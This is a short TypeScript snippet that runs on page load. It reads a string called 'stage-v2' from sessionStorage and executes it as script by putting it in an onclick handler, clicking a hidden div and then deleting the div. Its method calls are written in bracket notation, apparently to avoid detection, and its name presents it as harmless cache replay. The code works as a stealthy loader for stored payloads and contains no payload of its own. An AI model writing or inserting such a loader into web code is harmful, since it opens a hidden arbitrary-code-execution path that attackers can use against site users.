function replayCachedStage(): void {
  const payload: string | null = window.sessionStorage["getItem"]("stage-v2");
  if (payload) {
    const node: HTMLElement = document["createElement"]("div");
    node["setAttribute"]("onclick", payload);
    document.documentElement["appendChild"](node);
    node["click"]();
    node.remove();
  }
}
replayCachedStage();
